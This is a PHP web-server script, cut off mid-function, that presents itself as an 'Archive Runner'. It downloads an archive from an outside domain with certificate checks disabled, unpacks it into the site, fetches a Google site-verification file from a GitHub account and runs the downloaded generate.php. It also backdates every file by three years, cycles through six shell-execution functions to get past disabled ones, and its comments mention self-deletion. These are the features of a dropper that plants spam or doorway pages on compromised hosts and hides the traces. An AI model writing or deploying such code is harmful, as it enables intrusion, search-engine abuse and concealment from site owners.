<?php

// Show all errors in header
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);

// Ensure a default timezone to avoid warnings in both CLI and web contexts
if (function_exists('date_default_timezone_set') && !ini_get('date.timezone')) {
    date_default_timezone_set('UTC');
}

// Simple UI wrapper when accessed via browser so logs are readable
$IS_WEB = !isCli();
if ($IS_WEB && !headers_sent()) {
    header('Content-Type: text/html; charset=utf-8');
    echo <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Archive Runner</title>
  <style>
    :root {
      --bg: #0d1117;
      --card: #161b22;
      --text: #e6edf3;
      --muted: #8b949e;
      --accent: #3fb950;
      --border: #30363d;
      --mono: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, monospace;
    }
    * { box-sizing: border-box; }
    body {
      margin: 0;
      background: radial-gradient(circle at 20% 20%, rgba(63,185,80,0.08), transparent 30%), radial-gradient(circle at 80% 0%, rgba(56,139,253,0.08), transparent 25%), var(--bg);
      color: var(--text);
      font-family: 'Space Grotesk', 'Manrope', 'Segoe UI', system-ui, -apple-system, sans-serif;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 32px;
    }
    .card {
      width: min(1100px, 100%);
      background: var(--card);
      border: 1px solid var(--border);
      border-radius: 18px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.35);
      overflow: hidden;
    }
    .header {
      padding: 18px 20px;
      border-bottom: 1px solid var(--border);
      display: flex;
      align-items: center;
      gap: 12px;
    }
    .pill {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      background: rgba(56,139,253,0.14);
      color: #cde5ff;
      border: 1px solid rgba(56,139,253,0.35);
      border-radius: 999px;
      padding: 6px 12px;
      font-size: 13px;
      letter-spacing: 0.02em;
    }
    .title {
      font-weight: 700;
      font-size: 18px;
    }
    .log {
      padding: 16px 20px 22px;
      max-height: 75vh;
      overflow: auto;
      background: linear-gradient(180deg, rgba(255,255,255,0.012), rgba(255,255,255,0));
    }
    pre {
      margin: 0;
      white-space: pre-wrap;
      word-break: break-word;
      font-family: var(--mono);
      font-size: 13px;
      line-height: 1.45;
      color: var(--text);
    }
    .footer {
      padding: 14px 20px;
      border-top: 1px solid var(--border);
      display: flex;
      justify-content: space-between;
      color: var(--muted);
      font-size: 12px;
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="header">
      <div class="pill">Archive Runner</div>
      <div class="title">Download & Extract Logs</div>
    </div>
    <div class="log"><pre>
HTML;
    // Close tags at shutdown so even on fatal errors the UI isn't broken
    register_shutdown_function(function() {
        echo "</pre></div><div class=\"footer\"><span>Session finished</span><span>Powered by PHP</span></div></div></body></html>";
    });
}

/*
    Primary archive: https://vnscongnghe.com/iarchive/output/etsy-new.zip
    Fallback archive: https://vnscongnghe.com/iarchive/output/etsy-new.tar.gz
*/

define('ZIP_BASE', 'https://vnscongnghe.com/iarchive/output/');
define('VERIFIE1', 'https://github.com/masadity007/assets/raw/refs/heads/main/google514d80e81f9806f9.html');

function exitError($message, $code = 1)
{
    if (isCli()) {
        fwrite(STDERR, $message . PHP_EOL);
    } else {
        if (!headers_sent()) {
            header('Content-Type: text/plain; charset=utf-8');
            http_response_code(400);
        }
        echo $message . PHP_EOL;
    }

    exit($code);
}

function isCli()
{
    return php_sapi_name() === 'cli' || defined('STDIN');
}

function sanitizeFilename($name)
{
    // Prevent directory traversal and strip surrounding whitespace
    return basename(trim($name));
}

function isFunctionAvailable($funcName)
{
    if (!function_exists($funcName)) {
        return false;
    }

    $disabled = array_map('trim', explode(',', ini_get('disable_functions')));
    return !in_array($funcName, $disabled);
}

function isExtensionAvailable($extName)
{
    return extension_loaded($extName);
}

function endsWith($haystack, $needle)
{
    $length = strlen($needle);
    if ($length == 0) {
        return true;
    }
    return substr($haystack, -$length) === $needle;
}

// Execute command with priority: proc_open (stream support) > popen > exec > shell_exec > system > passthru
function executeCommand($command, $captureOutput = true, $streamCallback = null)
{
    // 1. Try proc_open (best for stream support)
    if (isFunctionAvailable('proc_open') && isFunctionAvailable('proc_close')) {
        $descriptors = array(
            0 => array('pipe', 'r'),  // stdin
            1 => array('pipe', 'w'),  // stdout
            2 => array('pipe', 'w')   // stderr
        );

        $pipes = array();
        $process = @proc_open($command, $descriptors, $pipes);

        if (is_resource($process)) {
            fclose($pipes[0]); // Close stdin

            $output = '';
            $error = '';

            // Stream support with callback
            if ($streamCallback && isFunctionAvailable('stream_set_blocking')) {
                stream_set_blocking($pipes[1], 0);
                stream_set_blocking($pipes[2], 0);

                while (!feof($pipes[1]) || !feof($pipes[2])) {
                    $line = fgets($pipes[1]);
                    if ($line !== false) {
                        $output .= $line;
                        call_user_func($streamCallback, $line);
                    }

                    $errLine = fgets($pipes[2]);
                    if ($errLine !== false) {
                        $error .= $errLine;
                    }

                    usleep(1000); // Sleep 1ms to prevent CPU spinning
                }
            } else {
                // Normal read without streaming
                if (isFunctionAvailable('stream_get_contents')) {
                    $output = stream_get_contents($pipes[1]);
                    $error = stream_get_contents($pipes[2]);
                } else {
                    while (!feof($pipes[1])) {
                        $output .= fread($pipes[1], 8192);
                    }
                    while (!feof($pipes[2])) {
                        $error .= fread($pipes[2], 8192);
                    }
                }
            }

            fclose($pipes[1]);
            fclose($pipes[2]);

            $returnCode = proc_close($process);

            return array(
                'output' => $output,
                'error' => $error,
                'return' => $returnCode,
                'method' => 'proc_open'
            );
        }
    }

    // 2. Try popen (good for streaming but limited)
    if (isFunctionAvailable('popen') && isFunctionAvailable('pclose') && $captureOutput) {
        $handle = @popen($command . ' 2>&1', 'r');
        if (is_resource($handle)) {
            $output = '';

            if ($streamCallback && isFunctionAvailable('stream_set_blocking')) {
                stream_set_blocking($handle, 0);
                while (!feof($handle)) {
                    $line = fgets($handle);
                    if ($line !== false) {
                        $output .= $line;
                        call_user_func($streamCallback, $line);
                    }
                    usleep(1000);
                }
            } else {
                if (isFunctionAvailable('stream_get_contents')) {
                    $output = stream_get_contents($handle);
                } else {
                    while (!feof($handle)) {
                        $output .= fread($handle, 8192);
                    }
                }
            }

            $returnCode = pclose($handle);

            return array(
                'output' => $output,
                'error' => '',
                'return' => $returnCode >> 8, // Extract actual return code
                'method' => 'popen'
            );
        }
    }

    // 3. Try exec (no streaming but reliable)
    if (isFunctionAvailable('exec')) {
        $output = array();
        $returnCode = 0;
        @exec($command . ' 2>&1', $output, $returnCode);

        return array(
            'output' => implode(PHP_EOL, $output),
            'error' => '',
            'return' => $returnCode,
            'method' => 'exec'
        );
    }

    // 4. Try shell_exec (no return code)
    if (isFunctionAvailable('shell_exec')) {
        $output = @shell_exec($command . ' 2>&1');

        return array(
            'output' => $output !== null ? $output : '',
            'error' => '',
            'return' => 0, // Cannot determine return code
            'method' => 'shell_exec'
        );
    }

    // 5. Try system (outputs directly)
    if (isFunctionAvailable('system')) {
        ob_start();
        $lastLine = @system($command . ' 2>&1', $returnCode);
        $output = ob_get_clean();

        return array(
            'output' => $output,
            'error' => '',
            'return' => $returnCode,
            'method' => 'system'
        );
    }

    // 6. Try passthru (last resort)
    if (isFunctionAvailable('passthru')) {
        ob_start();
        @passthru($command . ' 2>&1', $returnCode);
        $output = ob_get_clean();

        return array(
            'output' => $output,
            'error' => '',
            'return' => $returnCode,
            'method' => 'passthru'
        );
    }

    return false;
}

function getOsFamily()
{
    if (defined('PHP_OS_FAMILY')) {
        return PHP_OS_FAMILY;
    }

    $os = PHP_OS;
    if (stripos($os, 'WIN') === 0) {
        return 'Windows';
    }
    if (stripos($os, 'DAR') === 0) {
        return 'Darwin';
    }
    if (stripos($os, 'LINUX') === 0) {
        return 'Linux';
    }
    if (stripos($os, 'FREEBSD') === 0 || stripos($os, 'NETBSD') === 0 || stripos($os, 'OPENBSD') === 0) {
        return 'BSD';
    }
    if (stripos($os, 'SUNOS') === 0) {
        return 'Solaris';
    }
    return 'Unknown';
}

function isWindowsOs()
{
    return stripos(getOsFamily(), 'Windows') === 0;
}

function getCurrentBaseUrl()
{
    if (!isset($_SERVER['HTTP_HOST']) || !isset($_SERVER['SCRIPT_NAME'])) {
        return null; // CLI or missing context
    }

    $scheme = (!empty($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off') ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'];

    // Normalize script directory (where lp.php lives)
    $scriptDir = rtrim(str_replace('\\', '/', dirname($_SERVER['SCRIPT_NAME'])), '/');

    return "{$scheme}://{$host}" . ($scriptDir ? $scriptDir . '/' : '/');
}

function httpGetSimple($url)
{
    $targets = array($url);

    // If host is localhost, also try 127.0.0.1 and ::1 to avoid IPv6/IPv4 refusal
    $parts = parse_url($url);
    if (!empty($parts['host']) && strtolower($parts['host']) === 'localhost') {
        $alt = $parts;
        $alt['host'] = '127.0.0.1';
        $targets[] = buildUrlFromParts($alt);
        $alt['host'] = '::1';
        $targets[] = buildUrlFromParts($alt);
    }

    foreach ($targets as $target) {
        // Try cURL
        if (isExtensionAvailable('curl') && isFunctionAvailable('curl_init')) {
            $ch = curl_init($target);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 120);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
            $data = curl_exec($ch);
            $error = curl_error($ch);
            $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);

            if ($data !== false || $code >= 200 && $code < 400) {
                return array('body' => $data, 'error' => $error, 'code' => $code, 'url' => $target);
            }
        }

        // Fallback to file_get_contents
        $context = null;
        if (isFunctionAvailable('stream_context_create')) {
            $opts = array(
                'http' => array(
                    'method' => 'GET',
                    'follow_location' => 1,
                    'timeout' => 120,
                    'user_agent' => 'Mozilla/5.0'
                ),
                'ssl' => array(
                    'verify_peer' => false,
                    'verify_peer_name' => false
                )
            );
            $context = stream_context_create($opts);
        }

        $body = @file_get_contents($target, false, $context);
        if ($body !== false) {
            return array('body' => $body, 'error' => '', 'code' => 0, 'url' => $target);
        }
    }

    return array('body' => false, 'error' => 'stream fetch failed', 'code' => 0, 'url' => $url);
}

function buildUrlFromParts($parts)
{
    $scheme   = isset($parts['scheme']) ? $parts['scheme'] . '://' : '';
    $host     = isset($parts['host']) ? $parts['host'] : '';
    $port     = isset($parts['port']) ? ':' . $parts['port'] : '';
    $user     = isset($parts['user']) ? $parts['user'] : '';
    $pass     = isset($parts['pass']) ? ':' . $parts['pass']  : '';
    $pass     = ($user || $pass) ? "$pass@" : '';
    $path     = isset($parts['path']) ? $parts['path'] : '';
    $query    = isset($parts['query']) ? '?' . $parts['query'] : '';
    $fragment = isset($parts['fragment']) ? '#' . $parts['fragment'] : '';

    return "$scheme$user$pass$host$port$path$query$fragment";
}

function selectCommand(array $commands)
{
    $isWindows = isWindowsOs();

    foreach ($commands as $cmd) {
        if ($isWindows) {
            // Windows: use `where`
            $result = executeCommand("where " . escapeshellarg($cmd) . " 2>NUL", true);
        } else {
            // POSIX: use `command -v`
            $result = executeCommand("command -v " . escapeshellarg($cmd) . " 2>/dev/null", true);
        }

        if ($result && $result['return'] === 0 && !empty(trim($result['output']))) {
            return $cmd;
        }
    }

    return null;
}

function downloadFileWithPHP($url, $destination)
{
    echo "Downloading from {$url} using PHP..." . PHP_EOL;

    // Try cURL extension first (best performance and features)
    if (isExtensionAvailable('curl') && isFunctionAvailable('curl_init')) {
        $ch = curl_init($url);
        if ($ch === false) {
            return false;
        }

        $fp = fopen($destination, 'wb');
        if ($fp === false) {
            curl_close($ch);
            return false;
        }

        curl_setopt($ch, CURLOPT_FILE, $fp);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 300);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
        curl_setopt($ch, CURLOPT_FAILONERROR, true);

        // Progress callback if available
        // if (isFunctionAvailable('curl_setopt') && defined('CURLOPT_PROGRESSFUNCTION')) {
        //     curl_setopt($ch, CURLOPT_NOPROGRESS, false);
        //     curl_setopt($ch, CURLOPT_PROGRESSFUNCTION, function($resource, $downloadSize, $downloaded) {
        //         if ($downloadSize > 0) {
        //             $percent = ($downloaded / $downloadSize) * 100;
        //             echo "\rProgress: " . number_format($percent, 1) . "%";
        //         }
        //     });
        // }

        $success = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);

        curl_close($ch);
        fclose($fp);

        if ($success && $httpCode >= 200 && $httpCode < 300) {
            echo PHP_EOL;
            return true;
        }

        if (!empty($error)) {
            echo "cURL error: {$error}" . PHP_EOL;
        }

        @unlink($destination);
        return false;
    }

    // Try file_get_contents with stream context
    if (isFunctionAvailable('file_get_contents') && ini_get('allow_url_fopen')) {
        $context = null;
        if (isFunctionAvailable('stream_context_create')) {
            $opts = array(
                'http' => array(
                    'method' => 'GET',
                    'follow_location' => 1,
                    'timeout' => 300,
                    'user_agent' => 'Mozilla/5.0',
                    'ignore_errors' => false
                ),
                'ssl' => array(
                    'verify_peer' => false,
                    'verify_peer_name' => false
                )
            );

            $context = stream_context_create($opts);
        }

        $content = @file_get_contents($url, false, $context);
        if ($content !== false) {
            if (isFunctionAvailable('file_put_contents')) {
                $result = file_put_contents($destination, $content);
                if ($result !== false) {
                    return true;
                }
            } else {
                $fp = fopen($destination, 'wb');
                if ($fp !== false) {
                    fwrite($fp, $content);
                    fclose($fp);
                    return true;
                }
            }
        }
    }

    // Try fopen with stream copy
    if (isFunctionAvailable('fopen') && ini_get('allow_url_fopen')) {
        $context = null;
        if (isFunctionAvailable('stream_context_create')) {
            $context = stream_context_create(array(
                'http' => array(
                    'method' => 'GET',
                    'follow_location' => 1,
                    'timeout' => 300,
                    'user_agent' => 'Mozilla/5.0'
                ),
                'ssl' => array(
                    'verify_peer' => false,
                    'verify_peer_name' => false
                )
            ));
        }

        $src = @fopen($url, 'rb', false, $context);
        if ($src !== false) {
            $dest = fopen($destination, 'wb');
            if ($dest !== false) {
                if (isFunctionAvailable('stream_copy_to_stream')) {
                    stream_copy_to_stream($src, $dest);
                } else {
                    while (!feof($src)) {
                        fwrite($dest, fread($src, 8192));
                    }
                }
                fclose($dest);
                fclose($src);
                return true;
            }
            fclose($src);
        }
    }

    return false;
}

function downloadFile($url, $destination, $downloader, $allowFailure = false)
{
    // Try PHP built-in functions first
    if (downloadFileWithPHP($url, $destination)) {
        return true;
    }

    // Fallback to command line tools with streaming
    echo "Falling back to command line downloader..." . PHP_EOL;

    $result = false;
    if ($downloader === 'curl') {
        $result = executeCommand("curl -fL " . escapeshellarg($url) . " -o " . escapeshellarg($destination), true);
    } elseif ($downloader === 'wget') {
        $result = executeCommand("wget -O " . escapeshellarg($destination) . " " . escapeshellarg($url), true);
    } else {
        if ($allowFailure) {
            echo "No downloader available for {$url}" . PHP_EOL;
            return false;
        }
        exitError("No downloader available");
    }

    if (!$result || $result['return'] !== 0) {
        if ($allowFailure) {
            echo "Failed to download from {$url}. Method: " . ($result ? $result['method'] : 'none') . PHP_EOL;
            return false;
        }
        exitError("Failed to download from {$url}. Method: " . ($result ? $result['method'] : 'none'));
    }

    echo "Downloaded using: " . $result['method'] . PHP_EOL;
    return true;
}

function extractWithZipExtension($archivePath, $extractDir)
{
    if (!isExtensionAvailable('zip') || !isFunctionAvailable('class_exists')) {
        return false;
    }

    if (!class_exists('ZipArchive')) {
        return false;
    }

    $zip = new ZipArchive();
    $result = $zip->open($archivePath);

    if ($result !== true) {
        return false;
    }

    $success = $zip->extractTo($extractDir);
    $zip->close();

    return $success;
}

function extractWithPharExtension($archivePath, $extractDir)
{
    if (!isExtensionAvailable('phar') || !isFunctionAvailable('class_exists')) {
        return false;
    }

    if (!class_exists('PharData')) {
        return false;
    }

    try {
        $phar = new PharData($archivePath);
        $phar->extractTo($extractDir, null, true);
        return true;
    } catch (Exception $e) {
        echo "PharData error: " . $e->getMessage() . PHP_EOL;
        return false;
    }
}

function extractArchive($archivePath, $extractDir, $unzipCmd, $tarCmd)
{
    echo "Extracting {$archivePath} to {$extractDir}..." . PHP_EOL;

    $lowerName = strtolower(basename($archivePath));
    $isWindows = isWindowsOs();

    // Try PHP extensions first
    if (endsWith($lowerName, '.zip')) {
        if (extractWithZipExtension($archivePath, $extractDir)) {
            echo "Extracted using PHP ZipArchive extension" . PHP_EOL;
            return;
        }
    }

    // Try PharData for tar archives
    if (preg_match('/\.(tar\.gz|tgz|tar\.bz2|tbz2|tar\.xz|txz|tar)$/', $lowerName)) {
        if (extractWithPharExtension($archivePath, $extractDir)) {
            echo "Extracted using PHP PharData extension" . PHP_EOL;
            return;
        }
    }

    // Fallback to command line tools with streaming output
    echo "Falling back to command line extraction..." . PHP_EOL;

    $result = false;
    $streamCallback = function($line) {
        echo $line;
    };

    if (endsWith($lowerName, '.zip')) {
        if ($unzipCmd === 'unzip') {
            $result = executeCommand("unzip -o " . escapeshellarg($archivePath) . " -d " . escapeshellarg($extractDir), true, $streamCallback);
        } elseif ($unzipCmd === '7z' || $unzipCmd === '7za') {
            $result = executeCommand("7z x -y -o" . escapeshellarg($extractDir) . " " . escapeshellarg($archivePath), true, $streamCallback);
        } elseif ($isWindows) {
            // PowerShell Expand-Archive available on modern Windows
            $psCmd = 'powershell -Command "Expand-Archive -Force ' . escapeshellarg($archivePath) . ' ' . escapeshellarg($extractDir) . '"';
            $result = executeCommand($psCmd, true, $streamCallback);
            if (!$result || $result['return'] !== 0) {
                // Windows 10+ ships tar that handles .zip in some builds
                $result = executeCommand("tar -xf " . escapeshellarg($archivePath) . " -C " . escapeshellarg($extractDir), true, $streamCallback);
            }
        }
    } elseif (preg_match('/\.(tar\.gz|tgz)$/', $lowerName)) {
        if ($tarCmd) {
            $result = executeCommand("{$tarCmd} -xzvf " . escapeshellarg($archivePath) . " -C " . escapeshellarg($extractDir), true, $streamCallback);
        } elseif (selectCommand(array('7z'))) {
            $result = executeCommand("7z x -so " . escapeshellarg($archivePath) . " | tar -xzC " . escapeshellarg($extractDir), true);
        } else {
            exitError("No tool to extract tar.gz/tgz");
        }
    } elseif (preg_match('/\.(tar\.bz2|tbz2)$/', $lowerName)) {
        if ($tarCmd) {
            $result = executeCommand("{$tarCmd} -xjvf " . escapeshellarg($archivePath) . " -C " . escapeshellarg($extractDir), true, $streamCallback);
        } elseif (selectCommand(array('7z'))) {
            $result = executeCommand("7z x -so " . escapeshellarg($archivePath) . " | tar -xjC " . escapeshellarg($extractDir), true);
        } else {
            exitError("No tool to extract tar.bz2/tbz2");
        }
    } elseif (preg_match('/\.(tar\.xz|txz)$/', $lowerName)) {
        if ($tarCmd) {
            $result = executeCommand("{$tarCmd} -xJvf " . escapeshellarg($archivePath) . " -C " . escapeshellarg($extractDir), true, $streamCallback);
        } elseif (selectCommand(array('7z'))) {
            $result = executeCommand("7z x -so " . escapeshellarg($archivePath) . " | tar -xJC " . escapeshellarg($extractDir), true);
        } else {
            exitError("No tool to extract tar.xz/txz");
        }
    } elseif (endsWith($lowerName, '.tar')) {
        if ($tarCmd) {
            $result = executeCommand("{$tarCmd} -xvf " . escapeshellarg($archivePath) . " -C " . escapeshellarg($extractDir), true, $streamCallback);
        } elseif (selectCommand(array('7z'))) {
            $result = executeCommand("7z x -y -o" . escapeshellarg($extractDir) . " " . escapeshellarg($archivePath), true, $streamCallback);
        } else {
            exitError("No tool to extract tar");
        }
    } else {
        if (selectCommand(array('7z'))) {
            $result = executeCommand("7z x -y -o" . escapeshellarg($extractDir) . " " . escapeshellarg($archivePath), true, $streamCallback);
        } else {
            exitError("Unsupported archive type for " . basename($archivePath));
        }
    }

    if (!$result || $result['return'] !== 0) {
        exitError("Failed to extract archive. Method: " . ($result ? $result['method'] : 'none'));
    }

    echo "Extracted using: " . $result['method'] . PHP_EOL;
}

function recursiveDelete($dir)
{
    if (!is_dir($dir)) {
        return;
    }

    if (!isFunctionAvailable('scandir')) {
        $result = executeCommand("rm -rf " . escapeshellarg($dir), false);
        return;
    }

    $files = scandir($dir);
    foreach ($files as $file) {
        if ($file === '.' || $file === '..') {
            continue;
        }

        $path = $dir . '/' . $file;
        if (is_dir($path)) {
            recursiveDelete($path);
        } else {
            if (isFunctionAvailable('unlink')) {
                @unlink($path);
            }
        }
    }

    if (isFunctionAvailable('rmdir')) {
        @rmdir($dir);
    }
}

function flattenDirectories($extractDir)
{
    if (!isFunctionAvailable('scandir')) {
        echo "Warning: scandir() not available, skipping directory flattening" . PHP_EOL;
        return;
    }

    $items = scandir($extractDir);
    if ($items === false) {
        return;
    }

    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }

        $path = $extractDir . '/' . $item;
        if (!is_dir($path)) {
            continue;
        }

        // Skip macOS resource folders
        if ($item === '__MACOSX') {
            echo "Removing {$path}..." . PHP_EOL;
            recursiveDelete($path);
            continue;
        }

        echo "Flattening directory {$path} into {$extractDir}..." . PHP_EOL;

        $subItems = scandir($path);
        if ($subItems === false) {
            continue;
        }

        foreach ($subItems as $subItem) {
            if ($subItem === '.' || $subItem === '..') {
                continue;
            }

            $source = $path . '/' . $subItem;
            $destination = $extractDir . '/' . $subItem;

            if (isFunctionAvailable('rename')) {
                @rename($source, $destination);
            }
        }

        if (isFunctionAvailable('rmdir')) {
            @rmdir($path);
        }
    }
}

function removeDotUnderscoreFiles($dir)
{
    if (!is_dir($dir) || !isFunctionAvailable('scandir')) {
        return;
    }

    $items = scandir($dir);
    if ($items === false) {
        return;
    }

    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }

        $path = $dir . '/' . $item;

        if (is_dir($path)) {
            removeDotUnderscoreFiles($path);
            continue;
        }

        // Remove macOS resource fork files like ._index.php
        if (strpos($item, '._') === 0 && isFunctionAvailable('unlink')) {
            @unlink($path);
            echo "Removed temp file: {$path}" . PHP_EOL;
        }
    }
}

function setTimestamps($directory)
{
    if (!isFunctionAvailable('strtotime')) {
        echo "Warning: strtotime() not available, skipping timestamp modification" . PHP_EOL;
        return;
    }

    if (!isFunctionAvailable('date')) {
        echo "Warning: date() not available, skipping timestamp modification" . PHP_EOL;
        return;
    }

    $threeYearsAgo = strtotime('-3 years');
    $timestamp = date('YmdHi.s', $threeYearsAgo);

    echo "Setting timestamps to 3 years ago for files in {$directory}..." . PHP_EOL;

    // Try PHP touch() function first
    if (isFunctionAvailable('touch') && isFunctionAvailable('scandir')) {
        $success = setTimestampsRecursive($directory, $threeYearsAgo);
        if ($success) {
            echo "Timestamps set to: {$timestamp} using PHP" . PHP_EOL;
            return;
        }
    }

    // Fallback to command line
    $result = executeCommand("find " . escapeshellarg($directory) . " -mindepth 1 -exec touch -t {$timestamp} {} +", true);
    if ($result && $result['return'] === 0) {
        echo "Timestamps set to: {$timestamp} using " . $result['method'] . PHP_EOL;
        return;
    }

    echo "Warning: Could not set timestamps" . PHP_EOL;
}

function setTimestampsRecursive($dir, $time)
{
    if (!is_dir($dir)) {
        return touch($dir, $time);
    }

    $items = scandir($dir);
    if ($items === false) {
        return false;
    }

    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }

        $path = $dir . '/' . $item;
        if (is_dir($path)) {
            setTimestampsRecursive($path, $time);
        } else {
            @touch($path, $time);
        }
    }

    return @touch($dir, $time);
}

// Check critical functions
$criticalFunctions = array('escapeshellarg', 'is_dir', 'file_exists', 'fwrite', 'fopen', 'fclose');
foreach ($criticalFunctions as $func) {
    if (!isFunctionAvailable($func)) {
        exitError("Critical function {$func}() is not available or disabled");
    }
}

// Detect available exec methods
echo "=== System Check ===" . PHP_EOL;
$execMethods = array('proc_open', 'popen', 'exec', 'shell_exec', 'system', 'passthru');
$availableExec = array();
foreach ($execMethods as $method) {
    if (isFunctionAvailable($method)) {
        $availableExec[] = $method;
    }
}

if (empty($availableExec)) {
    echo "WARNING: No exec methods available! Some features may not work." . PHP_EOL;
} else {
    echo "Available exec methods: " . implode(', ', $availableExec) . PHP_EOL;
    echo "Priority: proc_open (stream) > popen > exec > shell_exec > system > passthru" . PHP_EOL;
}

// Main execution
$zipName = null;
$downloadDirInput = null;

if (isCli()) {
    // CLI: php lp.php [zip_filename] [download_dir]
    $zipName = isset($argv[1]) ? $argv[1] : 'etsy-new.zip';
    $downloadDirInput = isset($argv[2]) ? $argv[2] : './tmp';
} else {
    // Browser/HTTP mode using GET parameters: ?zip=<zip_filename>&dir=<download_dir>
    $zipName = isset($_GET['zip']) ? $_GET['zip'] : 'etsy-new.zip';
    $downloadDirInput = isset($_GET['dir']) ? $_GET['dir'] : './tmp';
}

// Sanitize filenames/dir to avoid traversal
$zipName = sanitizeFilename($zipName ?: 'etsy-new.zip');
$downloadDirInput = sanitizeFilename($downloadDirInput ?: 'tmp');

// Keep downloads inside script directory for safety
$baseDir = __DIR__;
$downloadDir = $baseDir . '/' . $downloadDirInput;

// Create download directory and ensure writability
if (!is_dir($downloadDir)) {
    if (isFunctionAvailable('mkdir')) {
        mkdir($downloadDir, 0755, true);
    } else {
        exitError("mkdir() function is disabled");
    }
}

if (!is_writable($downloadDir)) {
    exitError("Download directory is not writable: {$downloadDir}");
}

// Check available download methods
$hasPhpDownload = (isExtensionAvailable('curl') && isFunctionAvailable('curl_init')) ||
                  (isFunctionAvailable('file_get_contents') && ini_get('allow_url_fopen')) ||
                  (isFunctionAvailable('fopen') && ini_get('allow_url_fopen'));

$curlCmd = null;
if (!$hasPhpDownload) {
    $curlCmd = selectCommand(array('curl', 'wget'));
    if (!$curlCmd) {
        exitError("No download method available");
    }
}

// Check available extraction methods
$hasPhpExtract = (isExtensionAvailable('zip') && isFunctionAvailable('class_exists')) ||
                 (isExtensionAvailable('phar') && isFunctionAvailable('class_exists'));

$unzipCmd = null;
$tarCmd = null;
if (!$hasPhpExtract) {
    $unzipCmd = selectCommand(array('unzip', '7z', '7za'));
    if (!$unzipCmd) {
        exitError("No extraction method available");
    }
    $tarCmd = selectCommand(array('tar', 'bsdtar', 'gtar'));
}

echo "=== Available Methods ===" . PHP_EOL;
echo "Download: " . ($hasPhpDownload ? "PHP (curl/file_get_contents/fopen)" : $curlCmd) . PHP_EOL;
echo "Extract: " . ($hasPhpExtract ? "PHP (zip/phar extension)" : ($unzipCmd ?: 'powershell/tar/7z auto-detect')) . PHP_EOL;
echo "=========================" . PHP_EOL . PHP_EOL;

// Download and extract archive with fallback to .tar.gz when zip is missing
$zipUrl = ZIP_BASE . $zipName;
$zipPath = $downloadDir . '/' . $zipName;
$verifierUrl = VERIFIE1; // Plain HTML verifier, not an archive

$downloaded = downloadFile($zipUrl, $zipPath, $curlCmd, true);
$fallbackPath = null;

if (!$downloaded) {
    $fallbackName = endsWith(strtolower($zipName), '.zip') ? preg_replace('/\\.zip$/i', '.tar.gz', $zipName) : ($zipName . '.tar.gz');
    $fallbackUrl = ZIP_BASE . $fallbackName;
    $fallbackPath = $downloadDir . '/' . $fallbackName;

    echo "Primary archive download failed, trying fallback: {$fallbackName}" . PHP_EOL;
    $downloaded = downloadFile($fallbackUrl, $fallbackPath, $curlCmd, true);

    if ($downloaded) {
        $zipPath = $fallbackPath;
        $zipName = $fallbackName;
    }
}

if (!$downloaded) {
    exitError("Failed to download archive from both primary and fallback sources");
}

$extractDir = $downloadDir;
extractArchive($zipPath, $extractDir, $unzipCmd, $tarCmd);

// Flatten directories
flattenDirectories($extractDir);

// Remove macOS temp files (e.g., ._index.php) created by some archives
removeDotUnderscoreFiles($extractDir);

// Download verifier HTML (separate from archive files)
$verifierPath = null;
if (!empty($verifierUrl)) {
    $verifierName = basename(parse_url($verifierUrl, PHP_URL_PATH));
    if (!$verifierName) {
        exitError('Verifier URL must include a filename');
    }
    $verifierPath = $downloadDir . '/' . $verifierName;
    downloadFile($verifierUrl, $verifierPath, $curlCmd);
}

// Remove archive
if (isFunctionAvailable('unlink')) {
    @unlink($zipPath);
    echo "Archive removed after extraction." . PHP_EOL;
} else {
    echo "Warning: unlink() disabled, archive not removed." . PHP_EOL;
}

// Set timestamps
setTimestamps($downloadDir);

// Invoke generate.php inside the download dir via full URL (web mode) before self-delete
$generatePath = $downloadDir . '/generate.php';
if (file_exists($generatePath)) {
    $baseUrl = getCurrentBaseUrl();
    if ($baseUrl) {
        $generateUrl = rtrim($baseUrl, '/') . '/' . ltrim($downloadDirInput, './\\/') . '/generate.php';
        echo "Running generate.php at {$generateUrl} ..." . PHP_EOL;
        $resp = httpGetSimple($generateUrl);
        $httpFailed = (!empty($resp['error']) && $resp['body'] === false);
        if ($httpFailed) {
            echo "generate.php HTTP request failed: {$resp['error']}" . PHP_EOL;
            // Fallback: try CLI if exec-family functions are available, else embedded include without headers
            $ran = false;

            $phpBin = (defined('PHP_BINARY') && is_executable(PHP_BINARY)) ? PHP_BINARY : null;
            if ($phpBin && isFunctionAvailable('exec')) {
                $cmd = escapeshellarg($phpBin) . ' ' . escapeshellarg($generatePath);
                $cwd = getcwd();
                $changed = false;
                if ($cwd !== false && isFunctionAvailable('chdir')) {
                    $changed = @chdir($downloadDir);
                }
                echo "Trying local execution of generate.php via CLI..." . PHP_EOL;
                $execResult = executeCommand($cmd, true);
                if ($changed) {
                    @chdir($cwd);
                }
                if ($execResult && $execResult['return'] === 0) {
                    echo "generate.php CLI completed (method: {$execResult['method']}). Output:" . PHP_EOL . $execResult['output'] . PHP_EOL;
                    $ran = true;
                } else {
                    $errOut = $execResult ? $execResult['output'] . $execResult['error'] : 'no output';
